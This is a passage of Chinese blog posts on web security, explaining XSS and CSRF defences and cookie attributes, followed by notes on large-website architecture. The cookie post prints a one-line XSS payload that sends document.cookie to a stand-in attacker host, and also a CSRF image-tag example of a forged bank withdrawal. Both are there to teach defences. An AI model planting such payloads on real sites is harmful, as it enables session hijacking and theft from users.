href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><p>CSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过<strong>禁止使用第三方带来cookies，增加验证码、token机制</strong>。2、B网站访问A网站，故所携带的referer为B网站。则可以通过<strong>验证referer，禁止来自第三方请求</strong></p><h4 id="禁止第三方网站带来cookies"><a href="#禁止第三方网站带来cookies" class="headerlink" title="禁止第三方网站带来cookies"></a>禁止第三方网站带来cookies</h4><p>通过Cookie的SameSite禁止第三方访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; path=/; SameSite</span><br></pre></td></tr></table></figure><p>由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用</p><p>详细<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility" target="_blank" rel="noopener">Cookie</a>可点击查看</p><h4 id="增加验证码，token"><a href="#增加验证码，token" class="headerlink" title="增加验证码，token"></a>增加验证码，token</h4><p>由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带</p><h4 id="验证referer，禁止来自第三方的请求"><a href="#验证referer，禁止来自第三方的请求" class="headerlink" title="验证referer，禁止来自第三方的请求"></a>验证referer，禁止来自第三方的请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// koa</span><br><span class="line">let referer = ctx.request.headers.referer</span><br><span class="line">if (/^https?:\/\/example.com/.test(referer)) &#123;</span><br><span class="line">  // error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer</p><p>在判断第三方请求时，可使用正则表达式</p><h2 id="CSRF攻击防御总结"><a href="#CSRF攻击防御总结" class="headerlink" title="CSRF攻击防御总结"></a>CSRF攻击防御总结</h2><ul><li>CSRF攻击主要是恶意网站访问已经具有登录态的网站</li><li>通过携带A网站的Cookie，以用户身份进行业务操作</li><li>攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站</li><li>防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/http/basic-cookies/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/http/basic-cookies/" itemprop="url">管中窥豹看Cookie</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T21:14:04+08:00">2019-04-09</time></span></div></header><div class="post-body" itemprop="articleBody"><p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">详细参数</a>。</p><h2 id="Cookie介绍"><a href="#Cookie介绍" class="headerlink" title="Cookie介绍"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p><blockquote><p><strong>Wikipedia:</strong></p><p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p><p><strong>MDN:</strong></p><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p></blockquote><p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p><p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p><div style="width:80%;margin:0 auto;text-align:center"><img src="/img/loading.gif" data-original="/http/basic-cookies/exchange-cookies.png" alt="cookies消息传递">Cookies的传输</div><p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p><h2 id="Cookie的特性"><a href="#Cookie的特性" class="headerlink" title="Cookie的特性"></a>Cookie的特性</h2><h3 id="前端数据存储及读写"><a href="#前端数据存储及读写" class="headerlink" title="前端数据存储及读写"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class="line"><span class="comment">// 可设置path，domain，max-age，expires，secure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 修改cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 查找cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"需要查找的cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure><p></p><h3 id="后端通过http头设置"><a href="#后端通过http头设置" class="headerlink" title="后端通过http头设置"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">参数</a><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以nodejs为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以koa为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure><p></p><h3 id="请求时通过http头传给后端"><a href="#请求时通过http头传给后端" class="headerlink" title="请求时通过http头传给后端"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p><div style="width:80%;margin:0 auto;text-align:center"><img src="/img/loading.gif" data-original="/http/basic-cookies/font-transfer-cookie.png" alt="请求Google">请求通过http头传送给后端</div><h3 id="遵守同源策略"><a href="#遵守同源策略" class="headerlink" title="遵守同源策略"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p><h2 id="Cookie作用及用途"><a href="#Cookie作用及用途" class="headerlink" title="Cookie作用及用途"></a>Cookie作用及用途</h2><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p><div style="width:80%;margin:0 auto;text-align:center"><br><img src="/img/loading.gif" data-original="/http/basic-cookies/out-path-cookie.png" alt="在主页的cookie"><br><br><br>在google.com的cookie<br><br><br><img src="/img/loading.gif" data-original="/http/basic-cookies/in-path-cookie.png" alt="在搜索的cookie"><br><br><br>在google.com/search的cookie<br><br><br></div><p>正因为cookie的作用域，使得cookie存储有着多样性。</p><p><strong>存储未登陆时用户唯一标识</strong></p><p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p><p>以新浪微博为例：</p><div style="width:80%;margin:0 auto;text-align:center"><br><img src="/img/loading.gif" data-original="/http/basic-cookies/unlogin-cookie.png" alt="未登陆状态下的cookie"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div><p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p><p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p><p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p><h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li>个性化设置（如用户自定义设置、主题等）</li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><h2 id="Cookie-的安全策略"><a href="#Cookie-的安全策略" class="headerlink" title="Cookie 的安全策略"></a>Cookie 的安全策略</h2><h3 id="Cookie与XSS的关系"><a href="#Cookie与XSS的关系" class="headerlink" title="Cookie与XSS的关系"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p></p><p>这种情况下的cookie则会发送到攻击者的网站。</p><h4 id="分析XSS攻击："><a href="#分析XSS攻击：" class="headerlink" title="分析XSS攻击："></a>分析XSS攻击：</h4><ul><li>会话被劫持</li><li>通过document获取cookie</li></ul><h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>会话劫持：使用cookie中Secure标识</li><li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li></ul><h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p><blockquote><p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p></blockquote><p>用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure><p><strong>HttpOnly</strong></p><blockquote><p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由 <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和 <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p></blockquote><p>用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure><h3 id="Cookie与CSRF的关系"><a href="#Cookie与CSRF的关系" class="headerlink" title="Cookie与CSRF的关系"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p><h4 id="分析CSRF攻击"><a href="#分析CSRF攻击" class="headerlink" title="分析CSRF攻击"></a>分析CSRF攻击</h4><ul><li>被攻击者本地Cookie信息没有过期</li><li>银行转账系统无二次确认，直接转账</li><li>第三方网站（不安全的聊天室或论坛）加载请求</li><li>攻击者无法读写Cookie</li></ul><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul><li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li><li>增加二次确认：目标网站对敏感操作无二次确认</li><li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li><li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li></ul><h4 id="参数介绍-1"><a href="#参数介绍-1" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p><blockquote><p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p></blockquote><p>用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><strong>请求类型</strong></th><th><strong>例子</strong></th><th><strong>非 SameSit</strong></th><th><strong>SameSite = Lax</strong></th><th><strong>SameSite = Strict</strong></th></tr></thead><tbody><tr><td style="text-align:left">link</td><td>&lt;a href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style="text-align:left">prerender</td><td>\&lt;link rel=”prerender” href=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style="text-align:left">form get</td><td>&lt;form method=”get” action=”…”></td><td>Y</td><td>Y</td><td>N</td></tr><tr><td style="text-align:left">form post</td><td>&lt;form method=”post” action=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style="text-align:left">iframe</td><td>&lt;iframe src=”…”></td><td>Y</td><td>N</td><td>N</td></tr><tr><td style="text-align:left">ajax</td><td>$.get(‘…’)</td><td>Y</td><td>N</td><td>N</td></tr><tr><td style="text-align:left">image</td><td>&lt;img src=”…”></td><td>Y</td><td>N</td><td>N</td></tr></tbody></table><h2 id="要点总结："><a href="#要点总结：" class="headerlink" title="要点总结："></a>要点总结：</h2><ul><li><strong>Cookie是服务器保存在本地的数据块</strong></li><li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li><li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li><li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li><li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li><li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/《大型网站技术架》读书笔记/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/随笔/《大型网站技术架》读书笔记/" itemprop="url">《大型网站技术架》读书笔记</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-31T20:28:25+08:00">2019-03-31</time></span></div></header><div class="post-body" itemprop="articleBody"><p>拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。</p><h3 id="大型网站系统特点"><a href="#大型网站系统特点" class="headerlink" title="大型网站系统特点"></a>大型网站系统特点</h3><ul><li>高并发、大流量</li><li>高可用</li><li>海量数据</li><li>用户分布广泛，网络情况复杂</li><li>安全环境恶劣</li><li>需求快速变更、发布频繁</li><li>渐进式发展</li></ul><h2 id="大型网站架构演化及发展历程"><a href="#大型网站架构演化及发展历程" class="headerlink" title="大型网站架构演化及发展历程"></a>大型网站架构演化及发展历程</h2><h5 id="初期网站"><a href="#初期网站" class="headerlink" title="初期网站"></a>初期网站</h5><p><img src="/img/loading.gif" data-original="/随笔/《大型网站技术架》读书笔记/websiteInit.jpeg" alt="初期应用服务器"></p><h5 id="最终架构的大型网站"><a href="#最终架构的大型网站" class="headerlink" title="最终架构的大型网站"></a>最终架构的大型网站</h5><p><img src="/img/loading.gif" data-original="/随笔/《大型网站技术架》读书笔记/websiteDisAppAndUseTec.jpeg" alt="业务及使用nosql"></p><h3 id="演化过程"><a href="#演化过程" class="headerlink" title="演化过程"></a>演化过程</h3><ul><li>应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器</li><li>添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询</li><li>使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力</li><li>数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库</li><li>使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户</li><li>使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上</li><li>使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持</li><li>业务拆分：将不同业务分在不同产品线，每个应用独立部署</li><li>分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务</li></ul><h3 id="网站架构误区"><a href="#网站架构误区" class="headerlink" title="网站架构误区"></a>网站架构误区</h3><ul><li>一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案</li><li>为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义</li><li>企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定</li></ul><h2 id="大型网站架构模式"><a href="#大型网站架构模式" class="headerlink" title="大型网站架构模式"></a>大型网站架构模式</h2><h4 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h4><p><img src="/img/loading.gif" data-original="/随笔/《大型网站技术架》读书笔记/hierarchy.jpeg" alt="分层"></p><p>大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。</p><p>分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构</p><p>分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）</p><h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><p>如果说分层是对软件的横向切割，那么分割是纵向切割</p><p>网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。</p><p>大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等</p><h4 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h4><ul><li>分布式应用和服务： 可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展</li><li>分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力</li><li>分布式数据及存储：单台机器无法提供海量存储</li><li>分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。</li><li>分布式配置，分布式锁，分布式文件等</li></ul><h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><p>多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器</p><h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段</p><ul><li>CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户</li><li>反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户</li><li>本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速</li><li>分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。</li></ul><p>使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性</p><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><ul><li>提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障</li><li>加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少</li><li>消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力</li></ul><h4 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h4><p>网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。</p><h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><p>网站发布应该具备以下环节</p><ul><li>发布自动化</li><li>代码管理：版本控制</li><li>自动化测试：自动检测并发送检测报告</li><li>自动化安全检测：对代码进行静态安全扫描部署及攻击测试</li><li>自动化部署：自动部署到生产环境</li><li>自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰</li><li>自动化报警：超出阈值发送邮件报警</li><li>自动化失效转移：将失效的服务器从集群隔离</li><li>自动化失效恢复：重新启动服务</li><li>自动化降级：访问高峰则关闭次要服务</li><li>自动化分配资源：将空闲资源合理分配给重要任务</li></ul><h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><ul><li>密码和手机校验</li><li>通信加密</li><li>验证码识别</li><li>敏感词汇过滤</li><li>风险信息控制</li></ul><h2 id="架构要素"><a href="#架构要素" class="headerlink" title="架构要素"></a>架构要素</h2><p>通俗说法：最高层次的规划，难以改变的决定</p><p>一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素</p><ul><li>性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等</li><li>可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用</li><li>伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制</li><li>扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品</li><li>安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略</li></ul><h2 id="网站的高性能架构"><a href="#网站的高性能架构" class="headerlink" title="网站的高性能架构"></a>网站的高性能架构</h2><h4 id="不同视角下的性能"><a href="#不同视角下的性能" class="headerlink" title="不同视角下的性能"></a>不同视角下的性能</h4><ul><li>用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间</li><li>开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能</li><li>运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等</li></ul><h4 id="性能优化策略"><a href="#性能优化策略" class="headerlink" title="性能优化策略"></a>性能优化策略</h4><ul><li>性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理</li><li>性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化</li></ul><h4 id="前端优化策略"><a href="#前端优化策略" class="headerlink" title="前端优化策略"></a>前端优化策略</h4><ul><li>减少http请求</li><li>使用浏览器缓存</li><li>启动压缩</li><li>css放在最上面，js放在页面最下面</li><li>减少cookie传输</li></ul><h4 id="CDN加速"><a href="#CDN加速" class="headerlink" title="CDN加速"></a>CDN加速</h4><p>CDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度</p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求</p><h4 id="缓存-1"><a href="#缓存-1" class="headerlink" title="缓存"></a>缓存</h4><ul><li>基本原理： K-V形式存储</li><li>合理使用缓存：数据读写比2:1以上使用缓存才有意义</li><li>数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读</li><li>缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机</li><li>缓存预热：提前加载缓存保证缓存可用</li><li>缓存穿透：将value为null的情况也加载在缓存中</li></ul><h4 id="代码优化"><a href="#代码优化" class="headerlink" 